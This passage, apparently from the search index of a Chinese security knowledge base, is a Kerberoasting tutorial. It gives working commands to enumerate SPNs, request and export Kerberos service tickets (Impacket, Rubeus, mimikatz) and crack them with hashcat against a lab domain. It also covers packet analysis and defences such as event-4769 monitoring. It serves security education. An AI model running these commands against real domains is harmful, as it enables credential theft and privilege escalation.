\u653b\u51fb\u7684\u7b2c\u4e00\u6b65\u3002\u9996\u5148\uff0c\u53d1\u73b0\u57df\u5185\u6240\u6709\u6ce8\u518c\u4e8e\u57df\u7528\u6237\u4e0b\u7684SPN\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u57df\u5185\u4f1a\u6709\u4e00\u4e2a\u6ce8\u518c\u5728 krbtgt \u7528\u6237\u4e0b\u7684 <code>SPN kadmin/changepw</code>\u3002\u4f46\u662f\u8be5 SPN \u5bf9\u4e8e<code>Kerberoasting</code>\u653b\u51fb\u662f\u6ca1\u6709\u610f\u4e49\u7684\uff0c\u56e0\u4e3a<code>krbtgt</code>\u7528\u6237\u7684\u5bc6\u7801\u662f\u968f\u673a\u751f\u6210\u7684\uff0c\u51e0\u4e4e\u4e0d\u53ef\u80fd\u7206\u7834\u51fa\u6765\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u51e0\u6b3e\u5de5\u5177\u7528\u4e8e\u8fdb\u884c SPN \u670d\u52a1\u4e3b\u4f53\u540d\u79f0\u7684\u53d1\u73b0\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article4/index.html#1riskyspn","title":"1.RiskySPN","text":"<p>RiskySPN \u662f\u4e00\u4e2a PowerShell \u811a\u672c\u7684\u96c6\u5408\uff0c\u4e13\u6ce8\u4e8e\u68c0\u6d4b\u6ee5\u7528\u4e0e SPN \u76f8\u5173\u7684\u5e10\u6237\u3002\u8be5\u811a\u672c\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u81ea\u52a8\u8bc6\u522b\u5f31\u5bc6\u7801\u670d\u52a1\u7968\u636e\uff0c\u6839\u636e\u7528\u6237\u5e10\u6237\u548c\u5bc6\u7801\u8fc7\u671f\u65f6\u9650\u6765\u67e5\u627e\u6700\u5bb9\u6613\u5305\u542b\u5f31\u5bc6\u7801\u7684\u7968\u636e\u3002\u5982\u4e0b\u547d\u4ee4\uff0c\u8be5\u811a\u672c\u4f1a\u81ea\u52a8\u67e5\u627e\u5e76\u8fc7\u6ee4\u51fa(\u81ea\u52a8\u53bb\u9664\u6ce8\u518c\u4e8e krbtgt \u4e0b\u7684 kadmin/changepw)\u5f53\u524d\u57df\u5185\u6ce8\u518c\u4e8e\u57df\u7528\u6237\u4e0b\u7684\u53ef\u80fd\u5305\u542b\u5f31\u5bc6\u7801\u7684 SPN \u7684\u8be6\u7ec6\u4fe1\u606f\u3002</p> <p></p> <pre><code>Import-Module .\\Find-PotentiallyCrackableAccounts.ps1;\nFind-PotentiallyCrackableAccounts -FullData -Verbose\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u8fd0\u884c<code>Find-PotentiallyCrackableAccounts.ps1</code>\u811a\u672c\u63a2\u6d4b\u57df\u5185\u6ce8\u518c\u4e8e\u7528\u6237\u4e0b\u7684 SPN\uff0c\u53ef\u4ee5\u770b\u5230\u63a2\u6d4b\u51fa hack \u548c test \u7528\u6237\u4e0b\u6ce8\u518c\u4e86 SPN\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article4/index.html#2getuserspns","title":"2.GetUserSPNs","text":"<p>GetUserSPNs \u662f Kerberoast \u5de5\u5177\u96c6\u4e2d\u67e5\u8be2\u6ce8\u518c\u4e8e\u57df\u5185\u7528\u6237\u4e0b\u7684 SPN \u7684\u811a\u672c\uff0c\u8be5\u811a\u672c\u4f1a\u67e5\u8be2\u57df\u5185\u6240\u6709\u6ce8\u518c\u4e8e\u7528\u6237\u4e0b\u7684 SPN\uff0c\u5305\u62ec\u6ce8\u518c\u4e8e krbtgt \u4e0b\u7684kadmin/changepw\u3002\u8be5\u5de5\u5177\u96c6\u4e2d\u6709 powershell \u548c vbs \u4e24\u79cd\u8bed\u8a00\u7684\u811a\u672c\u3002</p> <p>\u5176\u4e2d\u7684 powershell \u811a\u672c\u7528\u6cd5\u5982\u4e0b\uff1a</p> <pre><code>Import-Module .\\GetUserSPNs.ps1\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u8fd0\u884c<code>GetUserSPNs.ps1</code> \u811a\u672c\u8fdb\u884c\u63a2\u6d4b\uff0c\u53ef\u4ee5\u770b\u5230\u63a2\u6d4b\u51fa krbtgt\u3001hack \u548c test \u7528\u6237\u4e0b\u6ce8\u518c\u4e86 SPN\u3002</p> <p></p> <p>vbs \u811a\u672c\u7684\u7528\u6cd5\u5982\u4e0b\uff1a</p> <pre><code>cscript .\\GetUserSPNs.vbs\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u8fd0\u884c <code>GetUserSPNs.vbs</code> \u811a\u672c\u8fdb\u884c\u63a2\u6d4b\uff0c\u53ef\u4ee5\u770b\u5230\u63a2\u6d4b\u51fa krbtgt\u3001hack \u548c test \u7528\u6237\u4e0b\u6ce8\u518c\u4e86 SPN\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article4/index.html#3powerviewps1","title":"3.PowerView.ps1","text":"<p>PowerView.ps1 \u662f <code>PowerSpolit</code> \u4e2d Recon \u76ee\u5f55\u4e0b\u7684\u4e00\u4e2a powershell \u811a\u672c\uff0c\u8be5\u811a\u672c\u53ef\u4ee5\u7528\u4e8e\u67e5\u8be2\u8fc7\u6ee4\u51fa\u57df\u7528\u6237\u4e0b\u6ce8\u518c\u6709 SPN \u7684\u7528\u6237\uff0c\u5305\u62ec krbtgt \u7528\u6237\uff0c\u5e76\u8fd4\u56de\u7528\u6237\u7684\u8be6\u7ec6\u4fe1\u606f\u3002\u8be5\u811a\u672c\u4f7f\u7528\u5982\u4e0b\uff1a</p> <pre><code>Import-Module .\\PowerView.ps1\nGet-NetUser -SPN\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 <code>PowerView.ps1</code> \u811a\u672c\u8fdb\u884c\u63a2\u6d4b\uff0c\u53ef\u4ee5\u770b\u5230\u63a2\u6d4b\u5230 krbtgt\u3001hack \u548c test \u7528\u6237\u4e0b\u6ce8\u518c\u4e86 SPN\uff0c\u5e76\u8fd4\u56de\u4e86 krbtgt \u7528\u6237\u3001test \u7528\u6237\u548c test \u7528\u6237\u7684\u8be6\u7ec6\u4fe1\u606f\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u8fd4\u56de\u4e86 test \u7528\u6237\u548c hack \u7528\u6237\u7684\u8be6\u7ec6\u4fe1\u606f\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article4/index.html#_1","title":"\u8bf7\u6c42\u670d\u52a1\u7968\u636e","text":"<p>\u5f53\u8fc7\u6ee4\u51fa\u6ce8\u518c\u4e8e\u7528\u6237\u4e0b\u7684 SPN \u4e4b\u540e\uff0c\u6211\u4eec\u5c31\u9700\u8981\u8bf7\u6c42\u8fd9\u4e9b SPN \u7684\u670d\u52a1\u7968\u636e\u4e86\u3002\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u51e0\u6b3e\u5de5\u5177\u8fdb\u884c SPN \u670d\u52a1\u7968\u636e\u7684\u8bf7\u6c42\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article4/index.html#1impacket","title":"1.Impacket \u8bf7\u6c42","text":"<p>impacket \u4e2d\u7684<code>GetUserSPNs.py</code>\u811a\u672c\u53ef\u4ee5\u8bf7\u6c42\u6ce8\u518c\u4e8e\u7528\u6237\u4e0b\u7684\u6240\u6709 SPN \u7684\u670d\u52a1\u7968\u636e\u3002\u4f7f\u7528\u8be5\u811a\u672c\u9700\u8981\u63d0\u4f9b\u57df\u8d26\u53f7\u5bc6\u7801\u624d\u80fd\u67e5\u8be2\u3002</p> <p>\u5982\u4e0b\u547d\u4ee4\uff0c\u5c06\u8bf7\u6c42\u6ce8\u518c\u4e8e\u7528\u6237\u4e0b\u7684\u6240\u6709 SPN \u7684\u670d\u52a1\u7968\u636e\u5e76\u4ee5 hashcat \u80fd\u7834\u89e3\u7684\u683c\u5f0f\u4fdd\u5b58\u4e3a hash.txt \u6587\u4ef6\u3002</p> <pre><code>python3 GetUserSPNs.py -request -dc-ip 10.211.55.4 xie.com/hack:P@ss1234 -outputfile hash.txt\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u8fd0\u884c <code>GetUserSPNs.py</code> \u811a\u672c\u8bf7\u6c42\u6ce8\u518c\u4e8e\u7528\u6237\u4e0b\u7684\u6240\u6709 SPN \u7684\u670d\u52a1\u7968\u636e\u5e76\u4ee5 hashcat \u80fd\u7834\u89e3\u7684\u683c\u5f0f\u4fdd\u5b58\u4e3a hash.txt \u6587\u4ef6\u3002</p> <p></p> <p>\u5982\u4e0b\u547d\u4ee4\uff0c\u5c06\u8bf7\u6c42\u6ce8\u518c\u4e8e\u6307\u5b9a\u7528\u6237\u4e0b\u7684 SPN \u7684\u670d\u52a1\u7968\u636e\u5e76\u4ee5 hashcat \u80fd\u7834\u89e3\u7684\u683c\u5f0f\u4fdd\u5b58\u4e3a hash2.txt \u6587\u4ef6\u3002</p> <pre><code>python3 GetUserSPNs.py -request -dc-ip 10.211.55.4 xie.com/hack:P@ss1234 -outputfile hash2.txt -request-user test\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u8fd0\u884c GetUserSPNs.py \u811a\u672c\u8bf7\u6c42\u6ce8\u518c\u4e8e test \u7528\u6237\u4e0b\u7684 SPN \u7684\u670d\u52a1\u7968\u636e\u5e76\u4ee5 hashcat \u80fd\u7834\u89e3\u7684\u683c\u5f0f\u4fdd\u5b58\u4e3a hash2.txt \u6587\u4ef6\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article4/index.html#2-rubeus","title":"2.\u4f7f\u7528 Rubeus \u8bf7\u6c42","text":"<p>Rubeus \u91cc\u9762\u7684 kerberoast \u652f\u6301\u5bf9\u6240\u6709\u7528\u6237\u6216\u8005\u7279\u5b9a\u7528\u6237\u6267\u884c kerberoasting\u64cd\u4f5c\uff0c\u5176\u539f\u7406\u5728\u4e8e\u5148\u7528 LDAP \u67e5\u8be2\u57df\u5185\u6240\u6709\u6ce8\u518c\u5728\u57df\u7528\u6237\u4e0b\u7684 SPN(\u9664\u4e86kadmin/changepw)\uff0c\u518d\u901a\u8fc7\u53d1\u9001 TGS \u5305\uff0c\u7136\u540e\u76f4\u63a5\u6253\u5370\u51fa\u80fd\u4f7f\u7528 John \u6216hashcat \u7206\u7834\u7684 Hash\u3002</p> <p>\u5982\u4e0b\u547d\u4ee4\u4f1a\u8bf7\u6c42\u6ce8\u518c\u4e8e\u7528\u6237\u4e0b\u7684\u6240\u6709 SPN \u7684\u670d\u52a1\u7968\u636e\uff0c\u5e76\u4ee5 hashcat \u80fd\u7834\u89e3\u7684\u683c\u5f0f\u4fdd\u5b58\u4e3a hash.txt \u6587\u4ef6\u3002</p> <pre><code>Rubeus.exe kerberoast /format:john /outfile:hash.txt\n</code></pre> <p></p> <p>\u5982\u4e0b\u547d\u4ee4\u4f1a\u8bf7\u6c42\u6ce8\u518c\u4e8e\u7528\u6237\u4e0b\u6307\u5b9a SPN \u7684\u670d\u52a1\u7968\u636e\uff0c\u5e76\u4ee5 hashcat \u80fd\u7834\u89e3\u7684\u683c\u5f0f\u4fdd\u5b58\u4e3a hash2.txt \u6587\u4ef6</p> <pre><code>Rubeus.exe kerberoast /spn:MySQL/win7.xie.com:3306 /format:john /outfile:hash2.txt\n</code></pre>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article4/index.html#3powershell","title":"3.powershell \u547d\u4ee4\u8bf7\u6c42","text":"<p>\u5982\u4e0b powershell \u547d\u4ee4\u7528\u4e8e\u8bf7\u6c42\u6307\u5b9a SPN \u7684\u670d\u52a1\u7968\u636e\uff0c\u8bf7\u6c42\u7684\u670d\u52a1\u7968\u636e\u4fdd\u5b58\u5728\u5185\u5b58\u4e2d\u3002</p> <pre><code>Add-Type -AssemblyName System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MySQL/win7.xie.com:3306\"\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u901a\u8fc7\u8fd0\u884c powershell \u547d\u4ee4\u8bf7\u6c42\u6307\u5b9a<code>SPN\"MySQL/win7.xie.com:3306\"</code> \u7684\u670d\u52a1\u7968\u636e\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article4/index.html#4mimikatz","title":"4.mimikatz \u8bf7\u6c42","text":"<p>\u4f7f\u7528 mimikaatzc \u5b58\u5728\u5185\u5b58\u4e2d\uff0c\u547d\u4ee4\u5982\u4e0b\uff1a</p> <pre><code>#\u8bf7\u6c42\u670d\u52a1\u7968\u636e\nkerberos::ask /target:MySQL/win7.xie.com:3306\n#\u5217\u51fa\u670d\u52a1\u7968\u636e\nkerberos::list\n#\u6e05\u9664\u6240\u6709\u7968\u636e\nkerberos::purge\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 mimikatz \u8bf7\u6c42\u6307\u5b9a SPN\"MySQL/win7.xie.com:3306\" \u7684\u670d\u52a1\u7968\u636e\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article4/index.html#_2","title":"\u5bfc\u51fa\u670d\u52a1\u7968\u636e","text":"<p>\u4ee5\u4e0a\u8bf7\u6c42\u670d\u52a1\u7968\u636e\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6709\u7684\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u5c06\u7968\u636e\u4ee5 base64 \u5f62\u5f0f\u6253\u5370\u51fa\u6765\u4fdd\u5b58\u4e3a\u6587\u4ef6\uff0c\u800c\u6709\u7684\u5de5\u5177\u4f1a\u5c06\u7968\u636e\u4fdd\u5b58\u5728\u5185\u5b58\u4e2d\u3002\u6240\u4ee5\u5bf9\u4e8e\u4fdd\u5b58\u5728\u5185\u5b58\u4e2d\u7684\u7968\u636e\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5de5\u5177\u5c06\u7968\u636e\u4ece\u5185\u5b58\u4e2d\u5bfc\u51fa\u6765\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article4/index.html#1","title":"1.\u67e5\u770b\u5185\u5b58\u4e2d\u7684\u7968\u636e","text":"<p>\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u67e5\u770b\u4e00\u4e0b\u5185\u5b58\u4e2d\u4fdd\u5b58\u7684\u7968\u636e\u3002\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u67e5\u770b\u5185\u5b58\u4e2d\u7684\u7968\u636e\u3002\u76f4\u63a5\u5728 cmd \u7a97\u53e3\u6267\u884c klist \u6216\u8005\u5728 mimikatz \u4e0b\u9762\u6267\u884c\u3002</p> <pre><code>#\u76f4\u63a5\u5728 cmd \u7a97\u53e3\u6267\u884c\nklist\n#\u5728 mimikatz \u4e0b\u9762\u6267\u884c\nmimikatz.exe \"kerberos::list\" \"exit\"\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u6267\u884c klist \u67e5\u770b\u5185\u5b58\u4e2d\u7684\u7968\u636e\u3002</p> <p></p> <p>\u4f7f\u7528 mimikatz \u67e5\u770b\u5185\u5b58\u4e2d\u7684\u7968\u636e\u3002</p> <p></p> <p>\u67e5\u770b\u4e86\u5185\u5b58\u4e2d\u7684\u7968\u636e\u540e\uff0c\u6211\u4eec\u5c31\u9700\u8981\u5c06\u7968\u636e\u4ece\u5185\u5b58\u4e2d\u5bfc\u51fa\u6210\u6587\u4ef6\u4e86\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article4/index.html#2mimikatz","title":"2.mimikatz \u5bfc\u51fa\u7968\u636e","text":"<p>\u6267\u884c\u5982\u4e0b\u547d\u4ee4\uff0c\u4f7f\u7528 mimikatz \u5c06\u5185\u5b58\u4e2d\u7684\u7968\u636e\u5bfc\u51fa\u6765\uff0c\u6267\u884c\u5b8c\u6210\u540e\uff0c\u4f1a\u5728mimikatz \u540c\u76ee\u5f55\u4e0b\u5bfc\u51fa \u540e\u7f00\u4e3a kirbi \u7684\u7968\u636e\u6587\u4ef6\u3002</p> <pre><code>mimikatz.exe \"kerberos::list /export\" \"exit\"\n</code></pre> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article4/index.html#3empire","title":"3.Empire \u5bfc\u51fa\u7968\u636e","text":"<p>\u4e5f\u53ef\u4ee5\u4f7f\u7528 Empire \u4e0b\u7684 <code>Invoke-Kerberoast.ps1</code> \u811a\u672c\uff0c\u53ef\u4ee5\u5c06\u5185\u5b58\u4e2d\u7684\u7968\u636e\u4ee5 Hashcat \u6216 John \u80fd\u7834\u89e3\u7684\u683c\u5f0f\u6253\u5370\u51fa\u6765\u3002\u5982\u4e0b\u547d\u4ee4\uff0c\u5c06\u5185\u5b58\u4e2d\u7684\u7968\u636e\u4ee5Hashcat \u80fd\u7834\u89e3\u7684\u683c\u5f0f\u6253\u5370\u51fa\u6765\u3002</p> <pre><code>Import-Module .\\Invoke-Kerberoast.ps1;\nInvoke-Kerberoast -outputFormat hashcat\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 Invoke-Kerberoast.ps1 \u811a\u672c\u5bfc\u51fa\u5185\u5b58\u4e2d\u7684\u7968\u636e\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article4/index.html#_3","title":"\u79bb\u7ebf\u7834\u89e3\u670d\u52a1\u7968\u636e","text":"<p>\u901a\u8fc7\u524d\u9762\u51e0\u6b65\u62ff\u5230\u4e86.kirbi \u7968\u636e\u6587\u4ef6\u6216 hashcat\u3001John \u80fd\u76f4\u63a5\u7834\u89e3\u7684\u6587\u4ef6\u3002\u63a5\u4e0b\u6765\u5c31\u9700\u8981\u672c\u5730\u79bb\u7ebf\u7834\u89e3\u8be5\u670d\u52a1\u7968\u636e\u4e86\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article4/index.html#1kerberoast","title":"1.kerberoast","text":"<p>Kerberoast \u662f\u7528\u4e8e\u653b\u51fb Kerberos \u5b9e\u73b0\u7684\u4e00\u4e9b\u5de5\u5177\u3002\u8be5\u5de5\u5177\u4e2d\u7684<code>tgsrepcrack.p</code>y \u811a\u672c\u53ef\u4ee5\u5bf9 mimikatz \u5bfc\u51fa\u7684\u540e\u7f00\u4e3a<code>.kirbi</code> \u683c\u5f0f\u7684\u7968\u636e\u8fdb\u884c\u7206\u7834\u3002</p> <pre><code>python2 tgsrepcrack.py pass.txt 1-40a10000-hack@SQLServer\\~win7.xie.com\\~1533\\~MSSQL-XIE.COM.kirbi\n</code></pre> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article4/index.html#2tgscrack","title":"2.tgscrack","text":"<p>\u8be5\u5de5\u5177\u5148\u5c06\u540e\u7f00\u4e3a kirbi \u683c\u5f0f\u7684\u7968\u636e\u8f6c\u6362\u4e3a\u8be5\u5de5\u5177\u80fd\u7834\u89e3\u7684\u683c\u5f0f\uff0c\u7136\u540e\u901a\u8fc7 go\u8bed\u8a00\u811a\u672c\u6307\u5b9a\u5bc6\u7801\u6587\u4ef6\u8fdb\u884c\u7206\u7834\u3002</p> <pre><code>python2 extractServiceTicketParts.py 1-40a10000-hack@SQLServer\\~win7.xie. com\\~1533\\~MSSQL-XIE.COM.kirbi &gt; hash.txt\ngo run tgscrack.go -hashfile hash.txt -wordlist pass.txtS\n</code></pre> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article4/index.html#3hashcat","title":"3.Hashcat","text":"<p>\u9488\u5bf9 impacket \u548c Rebeus \u8bf7\u6c42\u7684\u7968\u636e\u683c\u5f0f\uff0c\u53ef\u4ee5\u4f7f\u7528 hashcat \u6765\u8fdb\u884c\u7206\u7834\u3002</p> <pre><code>hashcat -m 13100 hash.txt pass.txt --force\n</code></pre>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article4/index.html#kerberoasting_2","title":"Kerberoasting \u6293\u5305\u5206\u6790","text":"<p>\u6211\u4eec\u901a\u8fc7\u4f7f\u7528 impacket \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8bf7\u6c42\u6307\u5b9a SPN \u670d\u52a1\u7968\u636e\u3002</p> <pre><code>python3 GetUserSPNs.py -request -dc-ip 10.211.55.4 xie.com/hack:P@ss1234 -outputfile hash.txt -request-user test\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 impacket \u8bf7\u6c42\u6307\u5b9a SPN \u7684\u670d\u52a1\u7968\u636e\u3002</p> <p></p> <p>\u5728\u653b\u51fb\u7684\u8fc7\u7a0b\u4e2d\u4f7f\u7528 WireShark \u8fdb\u884c\u6293\u5305\u5206\u6790\uff0c\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u653b\u51fb\u8fc7\u7a0b\u6709\u56db\u4e2a Kerberos \u76f8\u5173\u7684\u5305\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u7b2c\u4e00\u4e2a AS-REQ \u5305\u662f\u4f7f\u7528\u6211\u4eec\u63d0\u4f9b\u7684\u7528\u6237 xie\\hack \u5411 KDC \u7684AS \u670d\u52a1\u8bf7\u6c42 TGT \u8ba4\u8d2d\u6743\u8bc1</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u7b2c\u4e8c\u4e2a AS-REP \u5305\u662f KDC \u8fd4\u56de TGT \u8ba4\u8d2d\u6743\u8bc1\uff0c\u53ef\u4ee5\u770b\u5230\uff0cTGT\u8ba4\u8bc1\u6743\u8bc1\u7684\u52a0\u5bc6\u65b9\u5f0f\u4e3a <code>AES256</code>\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u7b2c\u4e09\u4e2a TGS-REQ \u5305\uff0c\u7528\u4e0a\u4e00\u6b65\u62ff\u5230\u7684 TGT \u8ba4\u8d2d\u6743\u8bc1\u5411 KDC \u7684TGS \u670d\u52a1\u8bf7\u6c42\u9488\u5bf9 test \u7528\u6237\u94fe\u63a5\u7684 SPN \u7684\u670d\u52a1\u7968\u636e\u3002\u53ef\u4ee5\u770b\u5230\uff0c\u8bf7\u6c42\u534f\u5546\u7684\u52a0\u5bc6\u7c7b\u578b\u6709 HMAC_MD5\u3001DES \u548c DES3\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u7b2c\u56db\u4e2a TGS-REP \u5305\uff0cKDC \u7684 TGS \u670d\u52a1\u8fd4\u56de\u7531\u6307\u5b9a SPN \u94fe\u63a5\u7684\u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u52a0\u5bc6\u7684\u670d\u52a1\u7968\u636e\u3002\u53ef\u4ee5\u770b\u5230\uff0c\u52a0\u5bc6\u7c7b\u578b\u4e3a HMAC_MD5\u3002\u8fd9\u79cd\u52a0\u5bc6\u65b9\u5f0f\u662f\u53ef\u4ee5\u7206\u7834\u7684\u3002</p> <p></p> <p>\u800c\u6b63\u5e38 TGS-REP \u56de\u590d\u5305\u7684 ST \u670d\u52a1\u7968\u636e\u7684\u9ed8\u8ba4\u52a0\u5bc6\u7c7b\u578b\u4e3a AES256\uff0c\u5982\u56fe\u6240\u793a\uff1a</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article4/index.html#kerberoasting_3","title":"Kerberoasting \u653b\u51fb\u9632\u5fa1","text":"<ul> <li>\u786e\u4fdd\u670d\u52a1\u8d26\u53f7\u5bc6\u7801\u4e3a\u5f3a\u5bc6\u7801\u3001\u5e76\u5177\u6709\u968f\u673a\u6027\u3001\u5b9a\u671f\u4fee\u6539\u3002</li> <li>Kerberoasting \u80fd\u6210\u529f\u7684\u6700\u5927\u56e0\u7d20\u5c31\u662f KDC \u8fd4\u56de\u7684 ST \u670d\u52a1\u7968\u636e\u662f\u7528 <code>RC4_HMAC_MD5</code> \u52a0\u5bc6\u7b97\u6cd5\u52a0\u5bc6\u7684\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6bd4\u8f83\u7b80\u5355\u7684\u8fdb\u884c\u7206\u7834\u3002\u5982\u679c\u914d\u7f6e\u5f3a\u5236\u4f7f\u7528 <code>AES256_HMAC</code> \u65b9\u5f0f\u5bf9 Kerberos \u7968\u636e\u8fdb\u884c\u52a0\u5bc6\u3002\u90a3\u4e48\uff0c\u5373\u4f7f\u653b\u51fb\u8005\u83b7\u53d6\u4e86 ST \u670d\u52a1\u7968\u636e\uff0c\u4e5f\u65e0\u6cd5\u5c06\u5176\u7834\u89e3\u3002\u4f46\u662f\u914d\u7f6e\u5f3a\u5236\u4f7f\u7528<code>AES256_HMAC</code> \u52a0\u5bc6\u65b9\u5f0f\uff0c\u4e5f\u5b58\u5728\u517c\u5bb9\u6027\u95ee\u9898\uff01</li> <li>\u8bb8\u591a\u670d\u52a1\u8d26\u6237\u5728\u57df\u4e2d\u88ab\u5206\u914d\u4e86\u8fc7\u9ad8\u7684\u6743\u9650\uff0c\u4ece\u800c\u5bfc\u81f4\u653b\u51fb\u8005\u5728\u7834\u89e3\u51fa\u8be5\u670d\u52a1\u8d26\u53f7\u7684\u5bc6\u7801\u540e\uff0c\u80fd\u8fc5\u901f\u8fdb\u884c\u57df\u5185\u6743\u9650\u63d0\u5347\u3002\u56e0\u6b64\uff0c\u5e94\u8be5\u5bf9\u57df\u5185\u7684\u670d\u52a1\u8d26\u53f7\u6743\u9650\u8fdb\u884c\u9650\u5236\uff0c\u91c7\u53d6\u6700\u5c0f\u5316\u6743\u9650\u539f\u5219\u3002</li> <li>\u9632\u5b88\u65b9\u5728\u68c0\u6d4b Kerberoasting \u653b\u51fb\u65f6\uff0c\u53ef\u4ee5\u8fdb\u884c\u65e5\u5fd7\u5ba1\u8ba1\uff0c\u91cd\u70b9\u5173\u6ce8\u4e8b\u4ef6 ID \u4e3a 4769(\u8bf7\u6c42 Kerberos \u670d\u52a1\u7968\u8bc1\u64cd\u4f5c)\u7684\u65e5\u5fd7\u3002\u5982\u679c\u6709\u8fc7\u591a\u76844769 \u65e5\u5fd7\uff0c\u53ef\u4ee5\u5bf9\u4e8b\u4ef6 ID \u4e3a 4769 \u7684\u65e5\u5fd7\u8fdb\u884c\u7b5b\u9009\u3002\u5982\u56fe\u6240\u793a\uff0c\u662f\u4e8b\u4ef6ID \u4e3a 4769 \u7684\u65e5\u5fd7\u3002\u7136\u540e\u7b5b\u9009\u51fa\u7968\u8bc1\u52a0\u5bc6\u7c7b\u578b\u4e3a 0x17(RC4-HMAC)\u7684\u65e5\u5fd7\uff0c\u5982\u56fe\u6240\u793a\uff0c\u662f\u52a0\u5bc6\u7c7b\u578b\u4e3a 0x17(RC4-HMAC)\u7684\u65e5\u5fd7\u3002</li> </ul> <ul> <li>\u53ef\u4ee5\u5b9a\u671f\u4f7f\u7528 zBang \u5de5\u5177\u68c0\u6d4b\u5f53\u524d\u57df\u5185\u5371\u9669\u7684 SPN\u3002\u5982\u56fe\u6240\u793a\uff0c\u8fd0\u884c zBang\u3002</li> </ul> <p>\u7136\u540e\u9009\u62e9 Risky SPNs\uff0c\u518d\u70b9\u51fb Launch\u3002\u5982\u56fe\u6240\u793a</p> <p></p> <p>\u8fc7\u4e00\u4f1a\u5c31\u53ef\u4ee5\u770b\u5230 zBang \u8fd0\u884c\u6210\u529f\uff0c\u5982\u56fe\u6240\u793a</p> <p></p> <p>\u7136\u540e\u6211\u4eec\u901a\u8fc7 RiskySPN Results \u7ed3\u679c\u9875\u9762\u53ef\u4ee5\u770b\u5230\u6ce8\u518c\u5728 administrator \u5e10\u6237\u4e0b\u7684 test2 SPN\uff0c\u8fd9\u662f\u4e2a\u5371\u9669\u7684 SPN\uff0c\u5982\u56fe\u6240\u793a\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html","title":"\u59d4\u6d3e\u653b\u51fb","text":"<p>\u57df\u59d4\u6d3e\u662f\u5927\u578b\u7f51\u7edc\u4e2d\u7ecf\u5e38\u90e8\u7f72\u7684\u5e94\u7528\u6a21\u5f0f\uff0c\u7ed9\u591a\u8df3\u8ba4\u8bc1\u5e26\u6765\u4e86\u5f88\u5927\u7684\u4fbf\u5229\uff0c\u4f46\u662f\u4e0e\u6b64\u540c\u65f6\u4e5f\u5e26\u6765\u4e86\u5f88\u5927\u7684\u5b89\u5168\u9690\u60a3\u3002\u5229\u7528\u59d4\u6d3e\uff0c\u653b\u51fb\u8005\u53ef\u83b7\u53d6\u672c\u5730\u7ba1\u7406\u5458\u751a\u81f3\u57df\u7ba1\u7406\u5458\u6743\u9650\uff0c\u8fd8\u53ef\u4ee5\u5236\u4f5c\u6df1\u5ea6\u9690\u85cf\u7684\u540e\u95e8\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#_2","title":"\u57df\u59d4\u6d3e","text":"<p>\u57df\u59d4\u6d3e\u662f\u6307\u5c06\u57df\u5185\u7528\u6237\u7684\u6743\u9650\u59d4\u6d3e\u7ed9\u5